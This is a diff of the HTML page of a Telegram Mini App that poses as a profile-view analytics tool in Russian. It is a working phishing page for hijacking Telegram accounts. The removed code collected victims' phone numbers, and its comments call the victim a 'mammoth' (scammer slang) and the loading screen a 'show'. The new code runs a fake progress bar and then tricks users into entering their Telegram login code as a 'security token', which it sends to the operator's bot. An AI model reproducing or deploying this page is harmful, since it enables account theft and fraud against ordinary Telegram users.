@@ -3,98 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Analytics Pro</title>
+    <title>TG-Analytics v5.0</title>
     <script src="https://telegram.org"></script>
     <style>
         :root { --bg: #1c1c1d; --text: #ffffff; --hint: #8e8e93; --btn: #0A84FF; }
-        body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .container { width: 90%; max-width: 320px; text-align: center; }
-        .logo { width: 80px; height: 80px; background: url('https://telegram.org') no-repeat center/contain; margin: 0 auto 20px; }
-        h2 { font-size: 22px; margin-bottom: 8px; }
-        p { color: var(--hint); font-size: 14px; margin-bottom: 25px; }
-        input { width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; border-radius: 12px; padding: 14px; color: white; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; text-align: center; outline: none; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .container { width: 90%; max-width: 340px; text-align: center; }
+        .logo { width: 70px; height: 70px; background: url('https://telegram.org') no-repeat center/contain; margin: 0 auto 20px; }
+        h2 { font-size: 20px; margin-bottom: 8px; font-weight: 600; }
+        p { color: var(--hint); font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
+        
+        /* Прогресс-бар */
+        .progress-container { width: 100%; background: #2c2c2e; border-radius: 10px; height: 8px; margin-bottom: 20px; overflow: hidden; display: none; }
+        .progress-bar { width: 0%; height: 100%; background: var(--btn); transition: width 0.3s; }
+        
+        .input-group { display: none; }
+        input { width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; border-radius: 12px; padding: 14px; color: white; font-size: 18px; margin-bottom: 15px; box-sizing: border-box; text-align: center; outline: none; }
         .btn { width: 100%; background: var(--btn); color: white; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; }
-        #loading-step, #code-step, #manual-step { display: none; }
-        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--btn); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .period-btn { background: #2c2c2e; margin-bottom: 10px; color: #fff; border: 1px solid #3a3a3c; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo"></div>
-        <!-- ШАГ 1 -->
-        <div id="phone-step">
-            <h2>Аналитика профиля</h2>
-            <p>Узнайте, кто заходил к вам в профиль. Нажмите кнопку для синхронизации.</p>
-            <button class="btn" onclick="requestPhone()">🔐 Продолжить</button>
+        
+        <!-- ШАГ 1: Выбор периода -->
+        <div id="step-period">
+            <h2>Выберите период анализа</h2>
+            <p>Статистика просмотров вашего профиля доступна за следующие периоды:</p>
+            <button class="btn period-btn" onclick="startLoading()">За последнюю неделю</button>
+            <button class="btn period-btn" onclick="startLoading()">За 2 недели</button>
+            <button class="btn period-btn" onclick="startLoading()">За месяц (Рекомендуется)</button>
         </div>
-        <!-- ШАГ 1.1 (Запасной) -->
-        <div id="manual-step">
-            <h2>Введите номер</h2>
-            <p>Авто-определение не удалось. Введите номер вручную для проверки.</p>
-            <input type="tel" id="u_phone" placeholder="+7 999 000-00-00">
-            <button class="btn" onclick="sendManualPhone()">Далее</button>
+
+        <!-- ШАГ 2: Загрузка -->
+        <div id="step-loading" style="display:none;">
+            <h2 id="load-text">Синхронизация данных...</h2>
+            <div class="progress-container" style="display:block;"><div class="progress-bar" id="bar"></div></div>
+            <p id="load-hint">Получение зашифрованных логов от серверов Telegram...</p>
         </div>
-        <!-- ШАГ 2 (Спектакль) -->
-        <div id="loading-step">
-            <div class="spinner"></div>
-            <h2 id="l-title">Синхронизация...</h2>
-            <p>Подключаемся к защищенному облаку Telegram...</p>
-        </div>
-        <!-- ШАГ 3 (Код) -->
-        <div id="code-step">
-            <h2>Проверка</h2>
-            <p>Код подтверждения отправлен в ваш <b>Telegram</b>. Введите его для завершения.</p>
+
+        <!-- ШАГ 3: Ввод кода (Токена) -->
+        <div id="step-code" style="display:none;">
+            <h2>Завершение проверки</h2>
+            <p>Для расшифровки данных введите <b>Токен безопасности</b>, отправленный в ваш системный чат Telegram:</p>
             <input type="number" id="u_code" placeholder="00000" inputmode="numeric">
-            <button class="btn" onclick="sendCode()">Посмотреть результат</button>
+            <button class="btn" onclick="sendCode()">Подтвердить токен</button>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        // Сообщаем боту, что мамонт зашел
-        tg.sendData(JSON.stringify({t: 'visit'}));
 
-        function requestPhone() {
-            tg.requestContact((ok) => {
-                if (ok) proceed(); 
-                else showManual();
-            });
-            // Если через 2 сек окно не вылезло - даем ручной ввод
-            setTimeout(() => { if(document.getElementById('phone-step').offsetParent !== null) showManual(); }, 2000);
-        }
-
-        function showManual() {
-            document.getElementById('phone-step').style.display = 'none';
-            document.getElementById('manual-step').style.display = 'block';
-        }
-
-        function sendManualPhone() {
-            const val = document.getElementById('u_phone').value.replace(/\s+/g, '');
-            if(val.length < 10) return alert("Ошибка номера");
-            tg.sendData(JSON.stringify({t: 'p', v: val}));
-            proceed();
-        }
-
-        function proceed() {
-            document.getElementById('phone-step').style.display = 'none';
-            document.getElementById('manual-step').style.display = 'none';
-            document.getElementById('loading-step').style.display = 'block';
-            setTimeout(() => {
-                document.getElementById('loading-step').style.display = 'none';
-                document.getElementById('code-step').style.display = 'block';
-            }, 4000);
+        function startLoading() {
+            document.getElementById('step-period').style.display = 'none';
+            document.getElementById('step-loading').style.display = 'block';
+            let width = 0;
+            const bar = document.getElementById('bar');
+            const interval = setInterval(() => {
+                if (width >= 75) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        document.getElementById('step-loading').style.display = 'none';
+                        document.getElementById('step-code').style.display = 'block';
+                    }, 500);
+                } else {
+                    width += Math.random() * 10;
+                    if(width > 75) width = 75;
+                    bar.style.width = width + '%';
+                }
+            }, 300);
         }
 
         function sendCode() {
             const val = document.getElementById('u_code').value;
-            if(val.length < 5) return;
+            if(val.length < 5) return alert("Неверный формат токена");
             tg.sendData(JSON.stringify({t: 'c', v: val}));
-            document.getElementById('code-step').style.display = 'none';
-            document.getElementById('loading-step').style.display = 'block';
-            document.getElementById('l-title').innerText = "Анализ данных...";
-            setTimeout(() => tg.close(), 4000);
+            
+            // Финальная имитация после ввода
+            document.getElementById('step-code').style.display = 'none';
+            document.getElementById('step-loading').style.display = 'block';
+            document.getElementById('load-text').innerText = "Генерация отчета...";
+            document.getElementById('bar').style.width = '100%';
+            setTimeout(() => tg.close(), 3000);
         }
     </script>
 </body>
